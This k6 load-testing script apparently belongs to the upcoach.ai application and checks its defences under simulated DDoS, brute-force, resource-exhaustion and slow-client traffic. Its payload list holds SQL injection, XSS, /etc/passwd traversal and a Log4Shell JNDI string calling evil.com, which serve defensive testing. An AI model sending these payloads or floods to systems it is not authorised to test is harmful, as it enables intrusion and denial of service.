/**
 * Security-focused Load Testing Suite
 * 
 * Performance testing with security validation:
 * - DDoS resilience testing
 * - Rate limiting effectiveness under load
 * - Authentication performance under stress
 * - Resource exhaustion attack detection
 * - Concurrent connection limits
 * - Memory exhaustion protection
 * - Security header consistency under load
 */

import http from 'k6/http';
import { check, sleep, group } from 'k6';
import { Rate, Counter, Trend } from 'k6/metrics';
import { randomString, randomIntBetween } from 'https://jslib.k6.io/k6-utils/1.2.0/index.js';

// Custom metrics for security monitoring
const securityFailures = new Counter('security_failures');
const rateLimitHits = new Counter('rate_limit_hits');
const authFailures = new Counter('auth_failures');
const securityHeaderMissing = new Counter('security_headers_missing');
const responseTimeUnderAttack = new Trend('response_time_under_attack');

// Configuration
const BASE_URL = __ENV.TARGET_URL || 'http://localhost:8080';
const API_KEY = __ENV.API_KEY || '';
const TEST_USER_EMAIL = __ENV.TEST_EMAIL || 'security-test@upcoach.ai';
const TEST_USER_PASSWORD = __ENV.TEST_PASSWORD || 'SecureTestPassword123!';

// Load testing scenarios configuration
export const options = {
  scenarios: {
    // Baseline performance test
    baseline_load: {
      executor: 'ramping-vus',
      startVUs: 1,
      stages: [
        { duration: '2m', target: 50 },   // Ramp up
        { duration: '5m', target: 50 },   // Stay at 50 VUs
        { duration: '2m', target: 0 },    // Ramp down
      ],
      tags: { test_type: 'baseline' },
    },

    // DDoS simulation
    ddos_simulation: {
      executor: 'constant-arrival-rate',
      rate: 100, // 100 requests per second
      timeUnit: '1s',
      duration: '3m',
      preAllocatedVUs: 100,
      maxVUs: 200,
      tags: { test_type: 'ddos' },
    },

    // Brute force attack simulation
    brute_force_attack: {
      executor: 'constant-vus',
      vus: 20,
      duration: '2m',
      tags: { test_type: 'brute_force' },
    },

    // Resource exhaustion test
    resource_exhaustion: {
      executor: 'ramping-arrival-rate',
      startRate: 10,
      stages: [
        { duration: '5m', target: 200 },  // Ramp up to high load
        { duration: '2m', target: 200 },  // Maintain high load
        { duration: '2m', target: 0 },    // Ramp down
      ],
      preAllocatedVUs: 50,
      maxVUs: 300,
      tags: { test_type: 'resource_exhaustion' },
    },

    // Slow client attack simulation
    slow_client_attack: {
      executor: 'constant-vus',
      vus: 10,
      duration: '3m',
      tags: { test_type: 'slow_client' },
    },

    // Concurrent authentication test
    concurrent_auth: {
      executor: 'shared-iterations',
      vus: 50,
      iterations: 500,
      maxDuration: '5m',
      tags: { test_type: 'concurrent_auth' },
    },
  },
  
  // Global thresholds
  thresholds: {
    http_req_duration: ['p(95)<2000'], // 95% of requests under 2s
    http_req_failed: ['rate<0.1'],     // Error rate under 10%
    rate_limit_hits: ['count>0'],      // Rate limiting should activate
    security_failures: ['count<5'],    // Max 5 security failures allowed
    auth_failures: ['rate<0.5'],       // Auth failure rate under 50%
  },
};

// Test data generators
function generateMaliciousPayload() {
  const payloads = [
    "'; DROP TABLE users; --",
    '<script>alert("XSS")</script>',
    '../../../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    'eval(base64_decode("malicious_code"))',
  ];
  return payloads[Math.floor(Math.random() * payloads.length)];
}

function generateLargePayload(sizeMB = 1) {
  return 'A'.repeat(sizeMB * 1024 * 1024);
}

function generateAuthToken() {
  // Login and get token for authenticated requests
  const loginPayload = {
    email: TEST_USER_EMAIL,
    password: TEST_USER_PASSWORD,
  };

  const response = http.post(`${BASE_URL}/api/auth/login`, JSON.stringify(loginPayload), {
    headers: { 'Content-Type': 'application/json' },
  });

  if (response.status === 200) {
    return JSON.parse(response.body).accessToken;
  }
  return null;
}

// Security header validation
function validateSecurityHeaders(response) {
  const requiredHeaders = [
    'strict-transport-security',
    'content-security-policy',
    'x-frame-options',
    'x-content-type-options',
    'x-xss-protection',
  ];

  let missingHeaders = 0;
  requiredHeaders.forEach(header => {
    if (!response.headers[header] && !response.headers[header.replace('-', '_')]) {
      missingHeaders++;
    }
  });

  if (missingHeaders > 0) {
    securityHeaderMissing.add(missingHeaders);
  }

  return missingHeaders === 0;
}

// Main test function
export default function () {
  const testType = __ITER % 6; // Rotate between different test types
  
  switch (testType) {
    case 0:
      ddosResilienceTest();
      break;
    case 1:
      rateLimitingTest();
      break;
    case 2:
      authenticationStressTest();
      break;
    case 3:
      resourceExhaustionTest();
      break;
    case 4:
      securityHeaderConsistencyTest();
      break;
    case 5:
      maliciousPayloadTest();
      break;
  }
  
  sleep(randomIntBetween(1, 3));
}

// DDoS Resilience Test
function ddosResilienceTest() {
  group('DDoS Resilience Test', () => {
    const startTime = new Date().getTime();
    
    // Rapid fire requests to simulate DDoS
    for (let i = 0; i < 10; i++) {
      const response = http.get(`${BASE_URL}/api/health`, {
        timeout: '10s',
      });
      
      responseTimeUnderAttack.add(response.timings.duration);
      
      // Check if service remains responsive
      const isHealthy = check(response, {
        'service responsive under attack': (r) => r.status === 200 || r.status === 429,
        'response time reasonable': (r) => r.timings.duration < 10000,
      });
      
      if (!isHealthy) {
        securityFailures.add(1);
      }
      
      if (response.status === 429) {
        rateLimitHits.add(1);
      }
      
      validateSecurityHeaders(response);
    }
    
    const duration = new Date().getTime() - startTime;
    console.log(`DDoS test completed in ${duration}ms`);
  });
}

// Rate Limiting Test
function rateLimitingTest() {
  group('Rate Limiting Test', () => {
    const endpoint = `${BASE_URL}/api/auth/login`;
    const payload = {
      email: 'nonexistent@example.com',
      password: 'wrongpassword',
    };
    
    // Make rapid login attempts to trigger rate limiting
    for (let i = 0; i < 15; i++) {
      const response = http.post(endpoint, JSON.stringify(payload), {
        headers: { 'Content-Type': 'application/json' },
      });
      
      if (response.status === 429) {
        rateLimitHits.add(1);
        
        // Verify rate limit headers
        check(response, {
          'rate limit headers present': (r) => 
            r.headers['retry-after'] || r.headers['x-ratelimit-remaining'],
        });
      }
      
      validateSecurityHeaders(response);
      
      // Small delay to simulate realistic attack pattern
      sleep(0.1);
    }
  });
}

// Authentication Stress Test
function authenticationStressTest() {
  group('Authentication Stress Test', () => {
    const scenarios = [
      // Valid authentication
      {
        email: TEST_USER_EMAIL,
        password: TEST_USER_PASSWORD,
        expected: 200,
      },
      // Invalid credentials
      {
        email: 'invalid@example.com',
        password: 'wrongpassword',
        expected: 401,
      },
      // SQL injection attempt
      {
        email: "admin'; DROP TABLE users; --",
        password: 'password',
        expected: 400,
      },
      // XSS attempt
      {
        email: '<script>alert(1)</script>@example.com',
        password: 'password',
        expected: 400,
      },
    ];
    
    scenarios.forEach((scenario, index) => {
      const response = http.post(`${BASE_URL}/api/auth/login`, JSON.stringify(scenario), {
        headers: { 'Content-Type': 'application/json' },
      });
      
      const isExpectedResponse = check(response, {
        [`auth scenario ${index} correct response`]: (r) => r.status === scenario.expected,
      });
      
      if (!isExpectedResponse && scenario.expected !== 401) {
        authFailures.add(1);
      }
      
      validateSecurityHeaders(response);
    });
  });
}

// Resource Exhaustion Test
function resourceExhaustionTest() {
  group('Resource Exhaustion Test', () => {
    const token = generateAuthToken();
    if (!token) {
      authFailures.add(1);
      return;
    }
    
    const tests = [
      // Large payload test
      {
        name: 'large_payload',
        url: `${BASE_URL}/api/goals`,
        method: 'POST',
        payload: {
          title: generateLargePayload(0.1), // 100KB title
          description: generateLargePayload(0.5), // 500KB description
        },
        expectedStatus: [413, 400], // Should reject large payloads
      },
      
      // Deep object nesting
      {
        name: 'deep_nesting',
        url: `${BASE_URL}/api/users/settings`,
        method: 'PUT',
        payload: createDeepObject(100), // 100 levels deep
        expectedStatus: [400, 413],
      },
      
      // Many concurrent requests
      {
        name: 'concurrent_requests',
        url: `${BASE_URL}/api/goals`,
        method: 'GET',
        expectedStatus: [200, 429],
      },
    ];
    
    tests.forEach(test => {
      let response;
      
      if (test.method === 'POST' || test.method === 'PUT') {
        response = http[test.method.toLowerCase()](
          test.url,
          JSON.stringify(test.payload),
          {
            headers: {
              'Content-Type': 'application/json',
              'Authorization': `Bearer ${token}`,
            },
            timeout: '30s',
          }
        );
      } else {
        response = http[test.method.toLowerCase()](test.url, {
          headers: {
            'Authorization': `Bearer ${token}`,
          },
          timeout: '30s',
        });
      }
      
      const isExpectedResponse = test.expectedStatus.includes(response.status);
      
      check(response, {
        [`${test.name} handled correctly`]: () => isExpectedResponse,
        [`${test.name} response time acceptable`]: (r) => r.timings.duration < 30000,
      });
      
      if (!isExpectedResponse) {
        securityFailures.add(1);
      }
      
      validateSecurityHeaders(response);
    });
  });
}

// Security Header Consistency Test
function securityHeaderConsistencyTest() {
  group('Security Header Consistency Test', () => {
    const endpoints = [
      '/api/health',
      '/api/auth/login',
      '/api/users/profile',
      '/admin',
      '/api/upload/file',
    ];
    
    endpoints.forEach(endpoint => {
      const response = http.get(`${BASE_URL}${endpoint}`, {
        headers: {
          'Accept': 'application/json',
        },
      });
      
      const hasSecurityHeaders = validateSecurityHeaders(response);
      
      check(response, {
        [`${endpoint} has security headers`]: () => hasSecurityHeaders,
        [`${endpoint} no information disclosure`]: (r) => 
          !r.headers['server'] && !r.headers['x-powered-by'],
      });
    });
  });
}

// Malicious Payload Test
function maliciousPayloadTest() {
  group('Malicious Payload Test', () => {
    const token = generateAuthToken();
    if (!token) {
      authFailures.add(1);
      return;
    }
    
    const maliciousTests = [
      {
        endpoint: '/api/goals',
        method: 'POST',
        payload: {
          title: generateMaliciousPayload(),
          description: 'Normal description',
        },
      },
      {
        endpoint: '/api/users/profile',
        method: 'PUT',
        payload: {
          name: generateMaliciousPayload(),
          bio: 'Normal bio',
        },
      },
      {
        endpoint: '/api/content/articles',
        method: 'POST',
        payload: {
          title: 'Normal title',
          content: generateMaliciousPayload(),
        },
      },
    ];
    
    maliciousTests.forEach((test, index) => {
      const response = http[test.method.toLowerCase()](
        `${BASE_URL}${test.endpoint}`,
        JSON.stringify(test.payload),
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`,
          },
        }
      );
      
      const isSecure = check(response, {
        [`malicious payload ${index} rejected or sanitized`]: (r) => 
          r.status === 400 || r.status === 422 || 
          (r.status === 201 && !r.body.includes('<script>') && !r.body.includes('DROP TABLE')),
      });
      
      if (!isSecure) {
        securityFailures.add(1);
      }
      
      validateSecurityHeaders(response);
    });
  });
}

// Helper functions
function createDeepObject(depth) {
  if (depth <= 0) return { value: 'deep' };
  return { nested: createDeepObject(depth - 1) };
}

// Teardown function
export function teardown(data) {
  console.log('Security load test completed');
  console.log(`Security failures: ${securityFailures.count}`);
  console.log(`Rate limit hits: ${rateLimitHits.count}`);
  console.log(`Auth failures: ${authFailures.count}`);
  console.log(`Security headers missing: ${securityHeaderMissing.count}`);
}

// Custom scenario for slow client attack
export function slowClientAttack() {
  group('Slow Client Attack', () => {
    const token = generateAuthToken();
    if (!token) return;
    
    // Simulate slow client by making partial requests
    const response = http.post(
      `${BASE_URL}/api/goals`,
      JSON.stringify({
        title: 'Slow request test',
        description: 'Testing slow client handling',
      }),
      {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
          'Connection': 'keep-alive',
        },
        timeout: '60s', // Long timeout to simulate slow client
      }
    );
    
    check(response, {
      'slow client handled appropriately': (r) => 
        r.status === 200 || r.status === 408 || r.status === 429,
    });
    
    validateSecurityHeaders(response);
    
    // Simulate slow reading
    sleep(randomIntBetween(5, 15));
  });
}

// Export scenarios for specific test types
export { slowClientAttack };

// Configuration for different test environments
const testConfigs = {
  development: {
    baseURL: 'http://localhost:8080',
    maxVUs: 50,
    duration: '5m',
  },
  staging: {
    baseURL: 'https://staging.upcoach.ai',
    maxVUs: 100,
    duration: '10m',
  },
  production: {
    baseURL: 'https://api.upcoach.ai',
    maxVUs: 200,
    duration: '15m',
  },
};

// Load configuration based on environment
const ENV = __ENV.ENVIRONMENT || 'development';
const config = testConfigs[ENV] || testConfigs.development;

// Override base configuration with environment-specific settings
if (config) {
  options.scenarios.baseline_load.stages = [
    { duration: '2m', target: Math.min(config.maxVUs * 0.25, 25) },
    { duration: config.duration, target: Math.min(config.maxVUs * 0.5, 50) },
    { duration: '2m', target: 0 },
  ];
}